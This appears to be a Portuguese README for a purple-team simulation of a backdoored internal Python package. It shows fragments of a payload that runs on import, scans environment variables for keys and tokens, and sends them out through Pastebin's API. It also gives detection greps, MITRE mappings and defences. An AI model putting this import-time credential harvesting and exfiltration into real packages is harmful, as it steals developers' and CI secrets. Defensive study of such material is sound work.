# 📦 Supply Chain Attack Simulation — Compromised Internal Package

> **Type:** Tabletop / Purple Team — Supply Chain Attack Simulation
> **Technique:** Malicious code injection in internal Python package
> **CVE Reference:** Inspired by SolarWinds (CVE-2020-10148), XZ Utils (CVE-2024-3094)
>
> Simulação de um ataque de Supply Chain onde um pacote interno (`internal_utils`) é comprometido com um backdoor que executa na importação, coleta variáveis sensíveis do ambiente e simula exfiltração via **Pastebin como C2** — tudo enquanto a API pública do pacote permanece funcional e a aplicação vítima não percebe nada de errado.
>
> ⚠️ *Todo payload exibe dados localmente (tkinter popup ou print) sem envio real. Credenciais Pastebin são placeholders. Sem C2 operacional.*


## `Developed by: HKK`

---

## `$ cat ./objective.txt`

Demonstrar o ciclo completo de um **Software Supply Chain Attack**:

1. **Comprometimento do pacote** — backdoor injetado em um módulo interno legítimo
2. **Execução na importação** — payload roda automaticamente com `import internal_utils`
3. **Reconhecimento silencioso** — coleta de credenciais de ambiente sem alterar o comportamento esperado
4. **Exfiltração via serviço legítimo** — Pastebin como C2 (Living off Trusted Sites)
5. **API pública intacta** — aplicação vítima continua funcionando normalmente, sem alertas

---

## `$ cat ./architecture.txt`

```
┌─────────────────────────────────────────────────────────────────────────┐
│               SUPPLY CHAIN ATTACK — COMPONENT MAP                       │
│                                                                         │
│  ┌──────────────────────┐       ┌──────────────────────────────────┐   │
│  │   PACOTE LEGÍTIMO    │       │     PACOTE COMPROMETIDO          │   │
│  │   internal_utils     │  →→→  │     internal_utils               │   │
│  │                      │       │                                  │   │
│  │  process_data()  ✅  │       │  ROODKCAB()         ← BACKDOOR  │   │
│  │  get_version()   ✅  │       │  process_data()  ✅ ← intocada   │   │
│  │                      │       │  get_version()   ✅ ← intocada   │   │
│  └──────────────────────┘       │  pastebin_login()   ← C2 exfil  │   │
│                                 │  create_private_paste() ← C2    │   │
│                                 └──────────────┬───────────────────┘   │
│                                                │                       │
│  ┌──────────────────────────────────────────── │ ──────────────────┐   │
│  │   APLICAÇÃO VÍTIMA (app.py)                 │                   │   │
│  │                                             ▼                   │   │
│  │   import internal_utils  ←─────── ROODKCAB() executa aqui      │   │
│  │          │                        (antes de qualquer linha     │   │
│  │          │                         de código da aplicação)     │   │
│  │          ▼                                  │                   │   │
│  │   internal_utils.process_data(...)          │                   │   │
│  │   # Funciona normalmente ✅                  ▼                   │   │
│  │   # Sem erros, sem alertas         Pastebin API (C2 simulado)  │   │
│  └────────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## `$ cat ./design_decisions.md`

### 1. `ROODKCAB()` — Ofuscação pelo Nome Reverso

```python
def ROODKCAB():
```

**O que significa?** `ROODKCAB` = `BACKDOOR` escrito ao contrário — técnica clássica de ofuscação de nomenclatura em malware.

Em análise estática, um revisor de código procura por nomes suspeitos como `backdoor`, `steal`, `exfil`. `ROODKCAB` passa por essa revisão superficial sem levantar alertas imediatos. É a mesma lógica de strings XOR — dificultar detecção por assinatura sem precisar de criptografia.

Exemplos reais da técnica:
- Funções com nomes de variáveis aparentemente aleatórias: `a1b2c3()`
- Nomes que imitam funções legítimas: `_process_internal_data()`
- Unicode homoglyphs: `procesś_data()` (ś ≠ s)

---

### 2. Execução na Importação — O Vetor Central

```python
# No final do módulo, em nível de módulo (não dentro de função):
ROODKCAB()
```

**Por que executar na importação é o vetor mais poderoso de supply chain?**

Em Python, quando um módulo é importado, **todo o código de nível de módulo executa imediatamente** — não apenas definições de função e classe. Isso significa que:

```python
# app.py — aplicação vítima
import internal_utils   # ← ROODKCAB() executa AQUI

# O desenvolvedor nunca chama ROODKCAB()
# O desenvolvedor nunca sabe que existiu
resultado = internal_utils.process_data({"nome": "joao"})  # funciona normalmente
```

Essa característica é idêntica ao mecanismo explorado no **XZ Utils (CVE-2024-3094)** — o backdoor foi injetado no script de build do liblzma e executava durante a inicialização do processo `sshd`, sem que a função `main()` fosse diretamente comprometida.

---

### 3. API Pública Intacta — Dificuldade de Detecção

```python
# API pública normal do pacote (não alterada — difícil de detectar)
def process_data(data: dict) -> dict:
    return {k: str(v).upper() for k, v in data.items()}

def get_version() -> str:
    return "2.3.1"
```

**Por que manter a API funcional é fundamental para o ataque?**

Um pacote comprometido que quebra a funcionalidade esperada é detectado imediatamente — os testes falham, o CI/CD alerta, os desenvolvedores investigam. Ao manter a API completamente intacta:

- Todos os testes passam ✅
- Todos os outputs são idênticos ao esperado ✅
- Nenhum erro é gerado ✅
- O código de review foca na lógica de negócio, não no módulo utilitário ✅

Esse é exatamente o padrão do **SolarWinds (SUNBURST)** — o backdoor coexistiu com o produto funcional por meses sem ser detectado.

---

### 4. Coleta de Variáveis Sensíveis — Credential Hunting

```python
"sensitive_vars": [
    k for k in os.environ
    if any(w in k.upper() for w in [
        "KEY", "TOKEN", "SECRET", "PASSWORD",
        "AWS", "AZURE", "GCP",
        "DEV_TOKEN", "TOKENS", "CRYPTO_TOKEN",
        "PROCESSOR_ARCHITECTURE"
    ])
]
```

**Por que `os.environ` é um alvo tão valioso?**

Ambientes de desenvolvimento e CI/CD armazenam credenciais em variáveis de ambiente por convenção — é considerada uma prática mais segura que hardcode em código. Mas também cria uma superfície de ataque concentrada:

| Variável comum | O que expõe |
|---------------|-------------|
| `AWS_ACCESS_KEY_ID` + `AWS_SECRET_ACCESS_KEY` | Acesso completo à conta AWS |
| `GITHUB_TOKEN` | Acesso a repositórios privados, CI/CD |
| `AZURE_CLIENT_SECRET` | Acesso ao tenant Azure |
| `DATABASE_PASSWORD` | Credencial de banco de dados |
| `NPM_TOKEN` | Publicação de pacotes no npm (supply chain recursivo) |

**`PROCESSOR_ARCHITECTURE`** é um outlier intencional — identifica se o ambiente é x64 ou ARM, útil para o atacante escolher payloads compatíveis.

---

### 5. Pastebin como C2 — Living off Trusted Sites

```python
def pastebin_login(api_dev_key, username, password) -> str:
    url = "https://pastebin.com/api/api_login.php"
    response = requests.post(url, data=payload)
    return result  # api_user_key

def create_private_paste(data, api_dev_key, api_user_key, title="exfi"):
    payload = {
        "api_paste_private": "2",      # paste privado
        "api_paste_expire_date": "N",  # nunca expira
        ...
    }
    response = requests.post("https://pastebin.com/api/api_post.php", data=payload)
```

**Por que Pastebin e não um servidor C2 customizado?**

A mesma lógica do GitHub como C2 — tráfego para `pastebin.com` é HTTPS e indistinguível de uso legítimo em proxies e firewalls corporativos.

Vantagens adicionais do Pastebin:
- **`api_paste_private = 2`** (privado): paste não aparece em buscas públicas — apenas quem tem o link e a conta consegue acessar
- **`api_paste_expire_date = "N"`** (nunca expira): os dados ficam disponíveis indefinidamente
- **API REST simples**: sem dependência de bibliotecas especializadas, apenas `requests`

**Fluxo de exfiltração:**
```
1. pastebin_login()  → obtém api_user_key com credenciais da conta do atacante
2. ROODKCAB()        → coleta variáveis sensíveis do ambiente da vítima
3. process_data()    → normaliza os dados (upper case)
4. create_private_paste() → envia os dados para paste privado no Pastebin
5. Atacante acessa   → pastebin.com/[paste_id] com sua conta privada
```

---

### 6. Aplicação Vítima — Perspectiva do Desenvolvedor

```python
# app.py — como o desenvolvedor vê o código
import internal_utils   # linha inocente — nada parece errado

resultado = internal_utils.process_data({"nome": "joao", "valor": 42})
print("Resultado:", resultado)  # {'NOME': 'JOAO', 'VALOR': '42'} — funciona!
```

O desenvolvedor:
- Usa apenas `process_data()` — função documentada, funcional, com output esperado
- Nunca viu `ROODKCAB()` — está no corpo do módulo, não na documentação
- Nunca chamou `ROODKCAB()` — o ataque ocorreu transparentemente na linha `import`
- Não percebe nenhum comportamento anormal — sem erros, sem latência visível

---

## `$ cat ./mitre_mapping.yml`

```yaml
tactic: Initial Access
  - T1195.001  # Supply Chain Compromise: Software Dependencies
               # Comprometimento de internal_utils como dependência interna
               # (em cenários reais: PyPI, npm, Maven, NuGet)

tactic: Execution
  - T1059.006  # Command and Scripting Interpreter: Python
               # ROODKCAB() executa na inicialização do interpretador
               # via código de nível de módulo no __init__.py ou pacote

tactic: Persistence
  - T1546      # Event Triggered Execution
               # Executa a cada vez que qualquer script importa o módulo
               # sem necessidade de agendador ou hook explícito

tactic: Defense Evasion
  - T1036      # Masquerading
               # Nome ROODKCAB obscurece propósito; API pública intacta
               # o pacote parece legítimo em revisão superficial

  - T1027      # Obfuscated Files or Information
               # Nome reverso como técnica de ofuscação de nomenclatura

tactic: Discovery
  - T1552.007  # Unsecured Credentials: Container API / Env Variables
               # Busca sistemática por KEY, TOKEN, SECRET, PASSWORD em os.environ

  - T1082      # System Information Discovery
               # hostname, username, platform, PROCESSOR_ARCHITECTURE

tactic: Collection
  - T1005      # Data from Local System
               # Coleta de credenciais e metadados do ambiente

tactic: Exfiltration
  - T1567.002  # Exfiltration to Code Repository
               # create_private_paste() → Pastebin como repositório de dados exfiltrados

  - T1102      # Web Service (C2 via trusted third-party)
               # pastebin.com como C2 — tráfego HTTPS legítimo
```

---

## `$ cat ./real_world_parallels.md`

> Ataques reais com as mesmas TTPs implementadas nesta simulação.

| Ataque Real | Ano | TTP Equivalente |
|-------------|-----|----------------|
| **SolarWinds SUNBURST** | 2020 | Backdoor em pacote de software legítimo (Orion); API funcional intacta; C2 via DNS/HTTPS |
| **XZ Utils (CVE-2024-3094)** | 2024 | Código malicioso injetado no build script; executa na inicialização do sshd |
| **event-stream (npm)** | 2018 | Dependência npm comprometida; roubava chaves de carteira de criptomoeda |
| **PyPI malicious packages** | Recorrente | Typosquatting (colourama vs colorama); execução na importação via `__init__.py` |
| **Codecov breach** | 2021 | Script de CI/CD comprometido; coletava variáveis de ambiente do CI (tokens, chaves) |

O **Codecov** é especialmente relevante: o ataque comprometeu o script `bash uploader` do Codecov. Todo projeto que rodava `curl -s https://codecov.io/bash | bash` no CI/CD teve suas variáveis de ambiente (`$CI_TOKEN`, `$AWS_SECRET`) exfiltradas — exatamente o mesmo vetor do `os.environ` desta simulação.

---

## `$ cat ./detection_opportunities.md`

### Análise Estática do Pacote

```bash
# Procurar por código executável em nível de módulo (fora de if __name__ == '__main__')
grep -n "^[A-Z_]\+()" internal_utils.py     # funções chamadas no top-level
grep -n "os\.environ" internal_utils.py     # acesso a variáveis de ambiente
grep -n "requests\." internal_utils.py      # chamadas HTTP inesperadas
grep -n "socket\." internal_utils.py        # uso de rede inesperado

# Comparar hash do pacote com versão conhecida boa
sha256sum internal_utils.py
# Comparar com hash no repositório oficial / último commit limpo
```

### Análise de Comportamento em Runtime

```yaml
# Processo Python fazendo conexão HTTP durante import de módulo
Condição:
  parent_process: python.exe
  network_connection: pastebin.com OU requests para host externo
  trigger: importação de módulo (não chamada de API)
Severidade: ALTA
```

```yaml
# Acesso massivo a variáveis de ambiente por script Python
Condição:
  process: python.exe
  syscall: getenv() em loop
  pattern: busca por strings KEY, TOKEN, SECRET, PASSWORD
Severidade: ALTA
```

### Supply Chain — Controles Preventivos

| Controle | Implementação | O que previne |
|----------|--------------|--------------|
| **Dependency pinning** | `requirements.txt` com hash SHA256 | Versão comprometida substituindo versão boa |
| **Private PyPI** | Artifactory / AWS CodeArtifact | Typosquatting e pacotes externos maliciosos |
| **Audit de dependências** | `pip-audit`, `safety check` | CVEs conhecidos em dependências |
| **Revisão de código de pacotes internos** | PRs obrigatórios com diff completo | Injeção de código como nesta simulação |
| **Least privilege em CI/CD** | Secrets escopados por job, não por repositório | Limitar o que pode ser exfiltrado |
| **SLSA Framework** | Build provenance, attestation | Integridade da cadeia de build |

---

## `$ cat ./usage.sh`

```bash
# Instalar dependências
pip install requests

# Executar a simulação (vítima importando o pacote comprometido)
python app.py

# Output esperado:
# [Popup tkinter OU print no terminal]:
#   hostname: DESKTOP-XYZ
#   user: joao.silva
#   os: Windows
#   sensitive_vars: ['AWS_ACCESS_KEY_ID', 'GITHUB_TOKEN', ...]
# Resultado: {'NOME': 'JOAO', 'VALOR': '42'}  ← app funciona normalmente
```

---

## `$ cat ./lessons_learned.txt`

```
[+] Código em nível de módulo em Python executa na importação — vetor subestimado por devs
[+] API pública funcional é o melhor camuflagem — testes passam, nada parece errado
[+] os.environ é concentração de credenciais — um único import pode exfiltrar toda a infra
[+] Pastebin/GitHub como C2 passa transparentemente por firewalls corporativos
[+] ROODKCAB (nome reverso) passa por grep superficial mas falha em análise semântica
[+] Codecov breach mostrou que CI/CD é o ambiente mais rico em credenciais para atacar
[-] tkinter popup é óbvio — em ataque real, zero output para o usuário final
[-] api_user_key hardcoded no fluxo principal — em ataque real, obtida em runtime via C2
[-] Sem mecanismo de persistência — em ataque real, instalaria hook adicional
[-] Sem ofuscação do payload — análise estática trivialmente identifica ROODKCAB como suspeita
[→] Defesa principal: dependency pinning com hash + revisão obrigatória de PRs em pacotes internos
```

---

<p align="center">
  <i>Supply Chain Simulation · Tabletop Exercise · No real C2 · Placeholder credentials · MITRE T1195.001</i>
</p>
